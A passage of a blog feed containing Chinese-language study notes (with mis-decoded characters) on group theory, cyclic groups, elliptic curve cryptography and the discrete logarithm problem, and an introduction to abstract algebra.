æ­¤å°±æœ‰äº†ï¼š</p><p>Homomorphismï¼ˆåŒæ€æ˜ å°„ï¼‰: Suppose (G,â—¦) and (H,Â·) two groups. afunction Ï•:G â†’H is a Homomorphism iff âˆ€ x,yâˆˆG, Ï•(xâ—¦y)=Ï•(x)Â·Ï•(y)</p><p>å› æ­¤ï¼ŒThe category Grp contains all groups and all possiblehomomorphism between groups.</p><p>åŒæ€æ˜ å°„åœ¨ç¾¤è®ºä¸­çš„åœ°ä½ç›¸å½“äºçº¿æ€§å˜æ¢åœ¨çº¿æ€§ä»£æ•°çš„åœ°ä½ï¼Œ<strong>å®ƒæ˜¯ä¿æŒåŸºç¡€è¿ç®—ï¼ˆåŠ æ³•å’Œæ•°ä¹˜ï¼‰çš„æ˜ å°„ã€‚</strong></p><p>è‹¥åŒæ€æ˜ å°„æ˜¯ä¸€ä¸ªåŒå°„ï¼Œç§°ä¸º Isomorphism åŒæ„: A homomorphism Ï•: Gâ†’H isa Isomorphism â‡â‡’ it is bijective i.e. there is a one-to-onecorrespondence of elements between their underlying sets.</p><h2 id="å¾ªç¯ç¾¤">å¾ªç¯ç¾¤</h2><p>å¾ªç¯ç¾¤æ˜¯ä¸€ç§å¾ˆé‡è¦çš„ç¾¤ï¼Œä¹Ÿæ˜¯å·²è¢«å®Œå…¨è§£å†³äº†çš„ä¸€ç±»ç¾¤ã€‚ å…¶å®šä¹‰ä¸ºè‹¥ä¸€ä¸ªç¾¤G çš„æ¯ä¸€ä¸ªå…ƒéƒ½æ˜¯ G çš„æŸä¸€ä¸ªå›ºå®šå…ƒ a çš„ä¹˜æ–¹ï¼Œåˆ™ç§° G ä¸ºå¾ªç¯ç¾¤ï¼Œè®°ä½œG=(a)ï¼Œa ç§°ä¸º G çš„ä¸€ä¸ªç”Ÿæˆå…ƒã€‚</p><p><strong>å¾ªç¯ç¾¤æœ‰æ— é˜¶å¾ªç¯ç¾¤å’Œæœ‰é˜¶å¾ªç¯ç¾¤ä¸¤ç§ç±»å‹</strong>ï¼Œæœ‰é™ä¸å¦ä¸å¾ªç¯ä¸å¦æ— å¯¹åº”å…³ç³»ï¼Œæ˜¯ä¸¤ç§ç‹¬ç«‹çš„ä¸åŒç‰¹å¾ã€‚</p><p>è‹¥ G ä¸º g ç”Ÿæˆçš„ n é˜¶æœ‰é™å¾ªç¯ç¾¤ï¼Œé‚£ä¹ˆé›†åˆ G å¯ä»¥å†™ä½œ <spanclass="math inline">\(\{e, g, g^2, g^3,Â·Â·Â·,g^{n-1}\}\)</span>, å…¶ä¸­<span class="math inline">\(e=g^0=g^n\)</span>, e ä¸ºç¾¤çš„å•ä½å…ƒã€‚</p><p>å¯¹ç¾¤ G é‡Œé¢çš„ä»»æ„å…ƒç´  a ä¸æ–­æ±‚å¹‚éƒ½å¯ä»¥ç”Ÿæˆä¸€ä¸ªç¾¤ï¼Œç”¨ç¬¦å· <a>è¡¨ç¤ºã€‚<a> æ—¢å¯èƒ½æ˜¯æœ‰é™ç¾¤ï¼Œä¹Ÿå¯èƒ½æ˜¯æ— é™ç¾¤ã€‚</p><p>è®¾(a)æ˜¯ä¸€ä¸ªå¾ªç¯ç¾¤ï¼Œ (1)è‹¥ |a|=âˆï¼Œåˆ™(a)ä¸æ•´æ•°åŠ ç¾¤ Z åŒæ„ï¼› (2)è‹¥|a|=nï¼Œåˆ™(a)ä¸æ¨¡ n çš„å‰©ä½™ç±»åŠ ç¾¤ Zn åŒæ„ã€‚å› æ­¤ï¼Œä»åŒæ„è§’åº¦æ¥çœ‹ï¼Œå¾ªç¯ç¾¤æœ¬è´¨ä¸Šåªæœ‰ä¸¤ä¸ªï¼šæœ‰é™å¾ªç¯ç¾¤å’Œæ— é™å¾ªç¯ç¾¤</p><p>è®¾ G ä¸º g ç”Ÿæˆçš„ n é˜¶æœ‰é™å¾ªç¯ç¾¤,G çš„ä»»ä¸€å…ƒç´ å¯ä»¥è¡¨ç¤ºä¸º <spanclass="math inline">\(g^k\)</span>, å…¶é˜¶ç”±ä»¥ä¸‹å…¬å¼ç»™å‡ºï¼š <spanclass="math display">\[\operatorname{ord}\left(g^k\right)=\frac{n}{\operatorname{gcd}(k,n)}\]</span></p><p>æ¬§æ‹‰å‡½æ•°ï¼šå¯¹æ­£æ•´æ•° nï¼Œæ¬§æ‹‰å‡½æ•° <spanclass="math inline">\(\phi(n)\)</span> æ˜¯å°äºæˆ–ç­‰äº n çš„æ­£æ•´æ•°ä¸­ä¸ näº’è´¨çš„æ•°çš„æ•°ç›®</p><p>n é˜¶æœ‰é™å¾ªç¯ç¾¤ç”Ÿæˆå…ƒçš„ä¸ªæ•°ä¸º <spanclass="math inline">\(\phi(n)\)</span></p><p>ä»»ä½•æ— é™é˜¶å¾ªç¯ç¾¤æ˜¯åŒæ„äºæ•´æ•°åŠ ç¾¤ï¼Œ ä»»ä½•æœ‰é™é˜¶å¾ªç¯ç¾¤åŒæ„äºæ¨¡ nå‰©ä½™ç±»åŠ ç¾¤ã€‚åŒæ„ä¿æŒäº¤æ¢æ€§ï¼Œè€Œ a,bå‡å¯äº¤æ¢ï¼Œå› æ­¤ä»»ä½•å¾ªç¯ç¾¤éƒ½æ˜¯äº¤æ¢ç¾¤ï¼ˆé˜¿è´å°”ç¾¤ï¼‰</p><h2 id="å¸¸è§ç¾¤ç¯åŸŸç»“æ„">å¸¸è§ç¾¤ç¯åŸŸç»“æ„</h2><ol type="1"><li>æ•´æ•°åŠ ç¾¤ (Z,+) æ•´æ•°é›†å¯¹äºæ•´æ•°çš„åŠ æ³•æ„æˆæ•´æ•°åŠ ç¾¤ ï¼Œå…¶å•ä½å…ƒä¸º0ï¼Œé€†å…ƒä¸ºä¸€ä¸ªæ•°çš„ç›¸åæ•°ã€‚</li><li>æ•´æ•°ä¹˜æ³•æ˜¯å¹ºåŠç¾¤ï¼Œä¸å­˜åœ¨é€†å…ƒï¼Œä¸æ„æˆç¾¤ã€‚</li><li>çŸ©é˜µåŠ æ³•æ„æˆç¾¤ï¼ŒçŸ©é˜µä¹˜æ³•ä¸€èˆ¬ä¸å­˜åœ¨é€†å…ƒä»¥åŠä¸æ»¡è¶³äº¤æ¢å¾‹çŸ©é˜µä¹˜æ³•ï¼Œæ˜¯å¹ºåŠç¾¤ã€‚</li><li>æ•´æ•°åŠ æ³•ä¸ä¹˜æ³•<code>(Z,+,*)</code>, çŸ©é˜µ<code>(M_n,+,*)</code>æ„æˆç¯ã€‚</li><li>éé›¶æ¨¡ç´ æ•° p æ•´æ•°æœ‰é™åŸŸ GF(p)</li><li>éé›¶æœ‰ç†æ•°ä¹˜æ³•ç¾¤ <spanclass="math inline">\((Q^*ï¼ŒÂ·)\)</span>,å¯¹æ™®é€šä¹˜æ³•æ„æˆé˜¿è´å°”ç¾¤ã€‚æ•´æ•°é›†å¯¹äºæ•´æ•°çš„ä¹˜æ³•ä¸æ„æˆç¾¤ï¼Œå› ä¸ºå¹¶ä¸æ˜¯æ‰€æœ‰çš„æ•´æ•°åœ¨ä¹˜æ³•æ„ä¹‰ä¸‹éƒ½æœ‰é€†å…ƒã€‚æ•´æ•°é€šè¿‡åŠ ä¹˜æ³•é€†å…ƒæ‰©å±•åˆ°éé›¶æœ‰ç†æ•°ç¾¤ï¼Œæ‰æ„æˆç¾¤ã€‚</li><li>éé›¶å®æ•°ä¹˜æ³•ç¾¤ <span class="math inline">\((R^*, Â·)\)</span> æˆ–<span class="math display">\[\mathbb{R}^{\times}=\mathbb{R}\backslash\{0\}\]</span></li><li>çŸ©é˜µå…³äºåŠ æ³•å’Œä¹˜æ³• <spanclass="math display">\[\left(\mathcal{M}_n(\mathbb{R}),+,\times\right)\]</span>æ„æˆäº†ä¸€ä¸ªç¯ï¼Œä½†æ˜¯ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒçŸ©é˜µå¹¶ä¸æ„æˆåŸŸã€‚åœ¨çŸ©é˜µçš„æƒ…å†µä¸‹ï¼ŒåŠ æ³•å’Œä¹˜æ³•é€šå¸¸æ»¡è¶³ç»“åˆå¾‹å’Œåˆ†é…å¾‹ï¼Œä½†ä¸æ»¡è¶³äº¤æ¢å¾‹å’Œå­˜åœ¨é€†å…ƒç´ ã€‚å¯é€†çŸ©é˜µï¼ˆæˆ–ç§°ä¸ºéå¥‡å¼‚çŸ©é˜µï¼‰å…³äºåŠ æ³•å’Œä¹˜æ³•æ„æˆåŸŸï¼Œè¿™ä¸ªåŸŸç§°ä¸ºå¯é€†çŸ©é˜µåŸŸæˆ–è€…é€šå¸¸ç§°ä¸ºä¸€èˆ¬çº¿æ€§ç¾¤</li></ol><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><ol type="1"><li><ahref="https://baike.baidu.com/item/%E5%BE%AA%E7%8E%AF%E7%BE%A4/2876454#:~:text=%E5%BE%AA%E7%8E%AF%E7%BE%A4%E6%98%AF%E4%B8%80%E7%A7%8D,%E5%BE%AA%E7%8E%AF%E7%BE%A4%E4%B8%A4%E7%A7%8D%E7%B1%BB%E5%9E%8B%E3%80%82">å¾ªç¯ç¾¤_ç™¾åº¦ç™¾ç§‘</a></li><li><ahref="https://chenliang.org/2021/02/26/group-theory/">å¯†ç å­¦-02-ç¾¤è®ºåŸºç¡€Â· é™ˆäº®çš„ä¸ªäººåšå®¢</a></li><li><a href="https://en.wikipedia.org/wiki/Category_theory">Categorytheory - Wikipedia</a></li><li><ahref="https://www.bananaspace.org/wiki/%E6%9C%89%E9%99%90%E5%9F%9F">æœ‰é™åŸŸ- é¦™è•‰ç©ºé—´</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>5. ECC æ¤­åœ†æ›²çº¿</title>
      <link href="/blog/2023/03/10/crypto/math/5.ecc/"/>
      <url>/blog/2023/03/10/crypto/math/5.ecc/</url>
      
        <content type="html"><![CDATA[<h1 id="ecc-æ¤­åœ†æ›²çº¿">5. ECC æ¤­åœ†æ›²çº¿</h1><h2 id="ç®€ä»‹">ç®€ä»‹</h2><p>æ¤­åœ†æ›²çº¿å±äºä»£æ•°å‡ ä½•èŒƒç•´ï¼ˆalgebraicgeometryï¼‰ï¼Œç›®å‰è¢«æ•°è®ºå’Œç¾¤è®ºå¹¿æ³›ç ”ç©¶ï¼Œå¹¶åº”ç”¨äºå¯†ç å­¦ä¸­ã€‚è¯¥æ›²çº¿æ˜¯ä¸€ä¸ªåŒ…å«å¦‚ä¸‹å½¢å¼ç‚¹çš„å¹³é¢ä»£æ•°æ›²çº¿ï¼š<span class="math inline">\(y^2=x^3+ax+b\)</span>ï¼Œå…¶ä¸­ a å’Œ bæ˜¯å¸¸æ•°ã€‚ä¸åŒçš„å‚æ•° a å’Œ b ä¼šå¯¼è‡´ä¸åŒå½¢çŠ¶çš„æ¤­åœ†æ›²çº¿ã€‚</p><p>æ¤­åœ†æ›²çº¿çš„ä¸€ä¸ªé‡è¦æ€§è´¨æ˜¯å®ƒä»¬çš„ç‚¹å¯ä»¥è¿›è¡Œ"åŠ æ³•"è¿ç®—ã€‚é€šè¿‡å¯¹ä¸¤ä¸ªç‚¹è¿›è¡Œç‰¹æ®Šçš„åŠ æ³•è¿ç®—ï¼Œå¯ä»¥å¾—åˆ°ä¸€æ¡ä»ä½äºè¯¥æ›²çº¿ä¸Šçš„æ–°ç‚¹ã€‚è¿™ç§åŠ æ³•è¿ç®—çš„å®šä¹‰æ˜¯ç‰¹å®šçš„ï¼Œå¹¶ä¸”æœ‰ä¸€äº›è§„åˆ™ã€‚</p><p>æ¤­åœ†æ›²çº¿åœ¨å¯†ç å­¦ä¸­çš„åº”ç”¨å¾ˆå¤šï¼Œå…¶ä¸­æœ€è‘—åçš„æ˜¯ç”¨äºå…¬é’¥å¯†ç å­¦ä¸­çš„æ¤­åœ†æ›²çº¿åŠ å¯†ï¼ˆECCï¼‰ã€‚åœ¨ECC ä¸­ï¼Œæ¤­åœ†æ›²çº¿çš„æŸä¸ªç‚¹ G è¢«ç”¨ä½œå…¬å¼€çš„å…¬é’¥ï¼Œè€Œ "åŠ æ³•"è¿ç®—è¿‡ç¨‹ç”¨äºç”Ÿæˆäº’ç›¸å…±äº«äº¤æ¢çš„ keyï¼Œä»è€Œå®ç°åŠ å¯†å’Œè§£å¯†ã€‚ç”±äº ECCéœ€è¦æ¯”å…¶ä»–åŠ å¯†ç®—æ³•ä½¿ç”¨æ›´çŸ­çš„å¯†é’¥é•¿åº¦ï¼Œå› æ­¤å®ƒé€šå¸¸è¢«è®¤ä¸ºæ˜¯ä¸€ç§æ›´åŠ å®‰å…¨å’Œé«˜æ•ˆçš„åŠ å¯†æ–¹æ³•ã€‚</p><h2 id="è¿ç®—">è¿ç®—</h2><p>å®šä¹‰æ¤­åœ†æ›²çº¿ä¸Šçš„åŠ æ³•è¿ç®—ï¼šå°†ä¸¤ä¸ªç‚¹ç›¸åŠ å¾—åˆ°ç¬¬ä¸‰ä¸ªç‚¹çš„æ“ä½œã€‚è®¡ç®—A+Bï¼Œè¿‡ Aï¼ŒB ä¸¤ç‚¹åšä¸€æ¡ç›´çº¿ç©¿è¿‡æ¤­åœ†æ›²çº¿ï¼Œç„¶ååšå…³äº x è½´çš„è½´å¯¹ç§°ï¼š</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16785841055049.jpg"alt="ECC operation" /><figcaption aria-hidden="true">ECC operation</figcaption></figure><p>ç›´è§‚æ„Ÿå—ï¼šè§‚å¯Ÿä¸Šå›¾,å¯ä»¥å‘ç°è™½ç„¶ç‚¹ä½äºæ›²çº¿ä¸Šï¼Œä½†ç›¸å¯¹äºæ•´ä¸ªå¹³é¢è€Œè¨€ï¼Œ1P2P 3P ç­‰çš„ä½ç½®éå¸¸æ··ä¹±æ²¡æœ‰è§„å¾‹, è¿™å°±æ˜¯å›°éš¾é—®é¢˜æ‰€åœ¨ï¼Œå¯¼è‡´å…¶ç§é’¥ k æå…¶éš¾æ±‚ã€‚</p><h2 id="ç¦»æ•£åŒ–---æœ‰é™åŸŸ">ç¦»æ•£åŒ– -&gt; æœ‰é™åŸŸ</h2><p>æ¤­åœ†æ›²çº¿æ˜¯è¿ç»­çš„ï¼Œå®šä¹‰åœ¨å®æ•°åŸŸä¸Šï¼Œå¹¶ä¸é€‚åˆåŠ å¯†ã€‚å°†æ¤­åœ†æ›²çº¿å˜æˆç¦»æ•£çš„ç‚¹ï¼ŒæŠŠæ¤­åœ†æ›²çº¿æ˜ å°„åˆ°ä¸€ä¸ªæœ‰é™åŸŸä¸Šï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ï¼šæ¤­åœ†æ›²çº¿çš„ç¦»æ•£åŒ–æˆ–è€…åœ¨æœ‰é™åŸŸä¸Šçš„å®šä¹‰ã€‚</p><p>ä¸ºä»€ä¹ˆè¦ç¦»æ•£åŒ–ï¼Ÿ</p><blockquote><p>ä¸ºä»€ä¹ˆè¿ç»­å‡½æ•°ä¸é€‚åˆåŠ å¯†ï¼Œå› ä¸ºå®æ•°æ˜¯è¿ç»­çš„ï¼ŒçŸ¥é“ç»“æœå¯ä»¥ç”¨é€†è¿ç®—æ±‚è§£ï¼Œå‡½æ•°å€¼éšç€è‡ªå˜é‡çš„å˜åŒ–è€Œè¿ç»­å˜åŒ–ï¼Œè¿™æ„å‘³ç€åœ¨è¾“å…¥å€¼çš„å¾®å°å˜åŒ–ä¸‹ï¼Œå‡½æ•°å€¼ä¹Ÿä¼šéšä¹‹å¾®ç¬‘åœ°å˜åŒ–ï¼Œè¿™ç§è¿ç»­æ€§ä½¿å¾—å‡½æ•°çš„å˜åŒ–å¯ä»¥æ”»å‡»è€…é€šè¿‡è¾“å…¥è¾“å‡ºå¯¹ï¼ˆæ˜æ–‡-å¯†æ–‡å¯¹ï¼‰çš„åˆ†ææ‰€æ¢æµ‹åˆ°ï¼Œè¿™ç§æ”»å‡»æŠ€æœ¯æˆä¸ºâ€œå·®åˆ†åˆ†æâ€ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œç¦»æ•£å‡½æ•°åœ¨è¾“å…¥å€¼å‘ç”Ÿå¾®å°å˜åŒ–æ—¶ï¼Œè¾“å‡ºå€¼ä¹Ÿä¼šå‘ç”Ÿè¾ƒå¤§çš„å˜åŒ–ï¼Œè¿™ä½¿å¾—å·®åˆ†æ”»å‡»æ›´åŠ å›°éš¾ï¼Œå› æ­¤ç¦»æ•£å‡½æ•°æ›´é€‚åˆåŠ å¯†ç®—æ³•ï¼Œå¸¸è§ç¦»æ•£å‡½æ•°åŠ å¯†ç®—æ³•åŒ…æ‹¬RSAï¼Œæ¤­åœ†æ›²çº¿å¯†ç å­¦ç­‰ã€‚ è®¡ç®—æœºå¯¹æµ®ç‚¹æ•°çš„å¤„ç†ä¼šæŸå¤±ç²¾åº¦,äº§ç”ŸæŸäº›ä½çš„ æµ®ç‚¹ä½é”™è¯¯ï¼Œå¯¹è®¡ç®—è¿ç»­å‡½æ•°ä¸å‹å¥½ã€‚ä¸¾ä¾‹<code>1.2-1.0=0.19999999999999996â€‹â€‹</code>ï¼Œ<code>7/3=2.3333333333333335</code></p></blockquote><p>å°†å…¶æ˜ å°„åˆ°æœ‰é™åŸŸä¸Šï¼Œæ–¹ä¾¿è¿›è¡Œç¦»æ•£åŒ–çš„æ“ä½œï¼Œåœ¨æœ‰é™åŸŸä¸Šå°±ä¸å­˜åœ¨ä¸¢å¤±ç²¾åº¦é—®é¢˜äº†ã€‚</p><h2 id="æœ‰é™åŸŸä¸Šçš„æ¤­åœ†æ›²çº¿">æœ‰é™åŸŸä¸Šçš„æ¤­åœ†æ›²çº¿</h2><ol type="1"><li>æœ‰é™åŸŸä¸Šçš„æ¤­åœ†æ›²çº¿ä¸Šçš„ç‚¹æ•°é‡æ˜¯æœ‰é™çš„ã€‚å…¶æ•°é‡ç­‰äºæœ‰é™åŸŸçš„å¤§å°pã€‚è¯¥æ•°é‡åŒ…æ‹¬ä¸€ä¸ªç‰¹æ®Šçš„â€œæ— ç©·è¿œç‚¹â€ ï¼ˆInfinity Pointï¼‰ã€‚</li><li>åœ¨æœ‰é™åŸŸä¸Šï¼Œç”±äºç‚¹çš„æ•°é‡æ˜¯æœ‰é™çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å®šä¹‰æ¤­åœ†æ›²çº¿ä¸Šçš„å€ä¹˜è¿ç®—ï¼Œå³å°†ä¸€ä¸ªç‚¹è¯šæ„ä¸€ä¸ªæ•´æ•°kï¼Œå¾—åˆ°å¦ä¸€ä¸ªç‚¹ã€‚è¿™ä¸ªè¿ç®—å¯ä»¥é€šè¿‡é‡å¤è¿›è¡ŒåŠ æ³•æ¥å®ç°ï¼Œå³å°†ä¸€ä¸ªç‚¹ä¸æ–­åœ°åŠ ä¸Šè‡ªå·±ï¼Œç›´åˆ°åŠ äº†k æ¬¡å³å¾— kGã€‚</li><li>ç¬¦åˆäº¤æ¢å¾‹ï¼Œç»“åˆå¾‹ï¼Œåˆ†é…å¾‹</li></ol><p>P+Q è¿ç®—ï¼š</p><p><span class="math inline">\(x_3 \equiv k^2 - x_1 - x_2 \modp\)</span></p><p><span class="math inline">\(y_3 \equiv k(x_1-x_3)-y_2 \modp\)</span></p><p>è‹¥ <span class="math inline">\(P = Q\)</span>ï¼Œåˆ™ <spanclass="math inline">\(k = (3x_1^2+a)/2y_1 \mod p\)</span> è‹¥ <spanclass="math inline">\(P \ne Q\)</span>, åˆ™ <span class="math inline">\(k= y_2-y_1/(x_2-x_1) \mod p\)</span></p><p>æ ‡é‡ä¹˜æ³• kP, å…ˆåšå€æ•°ï¼Œå†åšåŠ æ³•ï¼ˆè¯¥æ–¹æ³•ç§°ä¸ºï¼šdouble and addï¼‰ï¼š</p><p><span class="math display">\[\begin{aligned}151 &amp; =10010111 \\&amp; =1 \cdot 2^7+0 \cdot 2^6+0 \cdot 2^5+1 \cdot 2^4+0 \cdot 2^3+1\cdot 2^2+1 \cdot 2^1+1 \cdot 2^0 \\&amp; =2^7+2^4+2^2+2^1+2^0+ \\\text { å³ } 151 P &amp; =2^7 P+2^4 P+2^2 P+2^1 P+2^0 P\end{aligned}\]</span></p><h2 id="ecdlp-æ¤­åœ†æ›²çº¿çš„ç¦»æ•£å¯¹æ•°å›°éš¾é—®é¢˜">ECDLPæ¤­åœ†æ›²çº¿çš„ç¦»æ•£å¯¹æ•°å›°éš¾é—®é¢˜</h2><p>é¦–å…ˆ, ä»»ä½•åŠ å¯†ç®—æ³•å¯ä»¥å®ç°åŠ å¯†çš„åŸå› éƒ½æ˜¯å› ä¸ºå­˜åœ¨ä¸€ä¸ªéš¾è§£çš„å›°éš¾é—®é¢˜,è¿™ä¸ªé—®é¢˜çš„å›°éš¾ç¨‹åº¦å†³å®šäº†è¿™ä¸ªç®—æ³•çš„åŠ å¯†å¼ºåº¦ã€‚</p><p>å¯¹äº ECC æ¤­åœ†æ›²çº¿ä¸Šçš„ä¸¤ä¸ªç‚¹ P å’Œ Qï¼Œ ä»»æ„æ•´æ•° k: Q = kP</p><p>ä¸ºä»€ä¹ˆæ˜¯å›°éš¾é—®é¢˜ï¼š</p><ol type="1"><li><p>ç»™å®š k ä¸ Pï¼Œæ ¹æ®åŠ æ³•æ³•åˆ™ï¼Œè®¡ç®— Q å¾ˆå®¹æ˜“ï¼ˆå¯¹åº”éªŒè¯è¿‡ç¨‹ï¼‰</p><p>è®¡ç®—è¿‡ç¨‹å¤§è‡´ä¸ºï¼šå°† k åˆ†è§£ä¸ºäºŒè¿›åˆ¶ï¼Œå¯¹åº”ä¸º 2^iPçš„åŠ å’Œå½¢å¼ï¼Œç„¶ååªéœ€è¦è®¡ç®—æå°‘éƒ¨åˆ†ï¼Œå°±å¯ä»¥å¾—åˆ° kPã€‚ä¾‹å¦‚ä¸Šè¿°ä¾‹å­151Pï¼Œåªéœ€è¦è®¡ç®— P+Pï¼Œ2P+2Pï¼Œ4P+4Pï¼Œ4P+2P, P å¹¶åŠ èµ·æ¥ï¼Œå¤§æ¦‚ 8æ¬¡è¿ç®—ï¼ŒåŸºæœ¬ä¸Šæ˜¯æšä¸¾æ¬¡æ•°çš„ O(logn)ã€‚</p></li><li><p>ç»™å®š Q ä¸ Pï¼Œæ±‚ k éå¸¸å›°éš¾ï¼ˆåœ¨ ECC çš„å®é™…åº”ç”¨ä¸­ï¼Œè´¨æ•° kå–çš„éå¸¸å¤§ï¼Œæƒ³ç©·ä¸¾å‡º k éå¸¸å›°éš¾ï¼‰ å¯¹äºæ”»å‡»è€…è€Œè¨€ï¼Œå®ƒä¸çŸ¥é“ kå€¼ï¼Œå› æ­¤éœ€è¦é€ä¸ªæšä¸¾ï¼Œ151P åˆ™éœ€è¦è®¡ç®— 150æ¬¡ã€‚å½“æˆ‘ä»¬ä½¿ç”¨æ¤­åœ†æ›²çº¿æ—¶ï¼Œé€‰å–çš„ k éå¸¸å¤§ã€‚ä¾‹å¦‚å‡è®¾å®‡å®™ä¸­çš„åŸå­æ•°ç›®ä¸º10^82ï¼ˆå¤§çº¦ 2^275ï¼‰ï¼Œæ­£å‘è®¡ç®— Q=kP çš„è¿ç®—é‡ä»…ä»…ä¸º 275 ä¸ª double-and-addæ­¥éª¤ï¼Œè€Œæ”»å‡»è€…æƒ³è¦æ¨æµ‹ kï¼Œ åˆ™éœ€è¦ 10^82-1 æ¬¡è®¡ç®—ã€‚</p></li></ol><p>æ‰€ä»¥ Q = kP(k ä¸ºå¤§æ•°)ï¼Œå·²çŸ¥ kï¼ŒP è®¡ç®— Qå¯¹æˆ‘ä»¬æ¥è¯´å¾ˆå®¹æ˜“ï¼Œå¯¹æ”»å‡»è€…æ¥è¯´ï¼Œå·²çŸ¥ Q Pï¼Œè®¡ç®— k åˆ™æ˜¯å›°éš¾çš„ã€‚</p><h2 id="åº”ç”¨">åº”ç”¨</h2><p>DH å¯†é’¥äº¤æ¢ï¼ŒRSA ç®—æ³•</p><h2 id="æ¨èä¸å‚è€ƒ">æ¨èä¸å‚è€ƒ</h2><ol type="1"><li><ahref="https://blog.cloudflare.com/a-relatively-easy-to-understand-primer-on-elliptic-curve-cryptography/">A(Relatively Easy To Understand) Primer on Elliptic CurveCryptography</a></li><li><ahref="https://fangpenlin.com/posts/2019/10/07/elliptic-curve-cryptography-explained/">EllipticCurve Cryptography Explained â€“ Fang-Pen's coding note</a></li><li><a href="https://curves.xargs.org/">The Animated EllipticCurve</a></li><li><ahref="https://andrea.corbellini.name/2015/05/17/elliptic-curve-cryptography-a-gentle-introduction/">EllipticCurve Cryptography: a gentle introduction - Andrea Corbellini</a></li><li><a href="https://www.johannes-bauer.com/compsci/ecc/">Elliptic CurveCryptography Tutorial</a></li><li><ahref="https://github.com/Antalpha-Labs/zkp-co-learn/discussions/29">ã€ECCã€‘åˆè¯†æ¤­åœ†æ›²çº¿_Demian101on github</a></li><li><ahref="https://github.com/huyuguang/zkpblog/blob/master/%E6%9C%89%E9%99%90%E5%9F%9F.md">zkpblog/æœ‰é™åŸŸ.mdat master Â· huyuguang/zkpblog Â· GitHub</a></li><li><ahref="https://github.com/AlexiaChen/AlexiaChen.github.io/issues/15#tocbar-iou9gg">ä»ç¾¤ç¯åŸŸåˆ°æ¤­åœ†æ›²çº¿å¯†ç å­¦Â· Issue #15 Â· AlexiaChen/AlexiaChen.github.io</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>0. å®è§‚è§’åº¦åˆ‡å…¥æŠ½è±¡ä»£æ•°ä¹‹ç¾¤ç¯åŸŸ</title>
      <link href="/blog/2023/03/03/crypto/math/0.abstract_alg_intro/"/>
      <url>/blog/2023/03/03/crypto/math/0.abstract_alg_intro/</url>
      
        <content type="html"><![CDATA[<h1 id="å®è§‚è§’åº¦åˆ‡å…¥æŠ½è±¡ä»£æ•°ä¹‹ç¾¤ç¯åŸŸ">0.å®è§‚è§’åº¦åˆ‡å…¥æŠ½è±¡ä»£æ•°ä¹‹ç¾¤ç¯åŸŸ</h1><h2 id="é›†åˆè®ºç°ä»£æ•°å­¦çš„æ ¹åŸº">é›†åˆè®ºï¼šç°ä»£æ•°å­¦çš„æ ¹åŸº</h2><p>ç°ä»£æ•°å­¦çš„åŸºç¡€æ˜¯é›†åˆè®ºï¼Œé›†åˆè®ºä¸­æœ€åŸºæœ¬çš„æ¦‚å¿µï¼šé›†åˆï¼ˆsetï¼‰ï¼Œå…³ç³»ï¼ˆrelationï¼‰ï¼Œå‡½æ•°ï¼ˆfunctionï¼‰,ç­‰ä»·ï¼ˆequivalenceï¼‰åœ¨å…¶ä»–æ•°å­¦åˆ†æ”¯çš„è¯­è¨€ä¸­å‡ ä¹å¿…ç„¶å­˜åœ¨çš„ã€‚TheBourbaki school å°† mathematical structures åˆ†ä¸ºä¸‰ç±»ï¼šOrderstructuresï¼ŒAlgebraic structuresï¼ŒTopological structuresï¼Œä»–ä»¬éƒ½æ˜¯åŸºäºset theory çš„ï¼Œæ›´é«˜é˜¶çš„æ•°å­¦ç»“æ„åŸºæœ¬ä¸Šå¯ä»¥å½’ä¸ºè¿™ä¸‰ç§åŸºæœ¬ç±»å‹çš„ç»„åˆã€‚</p><p>ä¸‹å›¾æ˜¯å¦ä¸€ç§æ›´ä¸ºè¯¦å°½çš„åˆ†ç±»ï¼š<imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16781664605753.jpg"alt="æ•°å­¦åˆ†ç±»" /></p><p>åœ¨é›†åˆè®ºçš„åŸºç¡€ä¸Šï¼Œç°ä»£æ•°å­¦æœ‰ä¸¤å¤§å®¶æ—ï¼šåˆ†æ(Analysis)å’Œä»£æ•°(Algebra)ã€‚è‡³äºå…¶å®ƒçš„ï¼Œæ¯”å¦‚å‡ ä½•å’Œæ¦‚ç‡è®ºï¼Œåœ¨å¤å…¸æ•°å­¦æ—¶ä»£ï¼Œå®ƒä»¬æ˜¯å’Œä»£æ•°å¹¶åˆ—çš„ï¼Œä½†æ˜¯å®ƒä»¬çš„ç°ä»£ç‰ˆæœ¬åˆ™åŸºæœ¬æ˜¯å»ºç«‹åœ¨åˆ†ææˆ–è€…ä»£æ•°çš„åŸºç¡€ä¸Šï¼Œå› æ­¤ä»ç°ä»£æ„ä¹‰è¯´ï¼Œå®ƒä»¬å’Œåˆ†æä¸ä»£æ•°å¹¶ä¸æ˜¯å¹³è¡Œçš„å…³ç³»ã€‚</p><p>åˆ†æå­¦ï¼šä¸»è¦æ¶‰åŠå¾®ç§¯åˆ†ï¼Œå®åˆ†æï¼Œæ‹“æ‰‘å­¦ï¼Œå¾®åˆ†å‡ ä½•ä»£æ•°å­¦ï¼šä¸»è¦æ¶‰åŠçº¿æ€§ä»£æ•°ï¼Œæä»£æ•°</p><p>æœ¬æ–‡ä»¥ä¸‹ä»ä¸‰ç§ç»“æ„åˆ†ç±»åˆ‡å…¥æŠ½è±¡ä»£æ•°</p><ul><li><p>Order structures: æ•°çš„ç›¸å¯¹å¤šå°‘ï¼Œå¤§å°ï¼Œä¾‹å¦‚ï¼šè‡ªç„¶æ•°</p></li><li><p>Algebraic structures an algebraic structure consists of anonempty set A, a collection of operations on A (typically binaryoperations such as addition and multiplication), and a finite set ofidentities, known as axioms, that these operations must satisfy.ä»£æ•°ç»“æ„ï¼šset of specific objects + correspondingoperations(ç±»ä¼¼è®¡ç®—æœºçš„æ•°æ®ç»“æ„ï¼šæ•°æ®+æ“ä½œ)ä»£æ•°ä¸»è¦ç 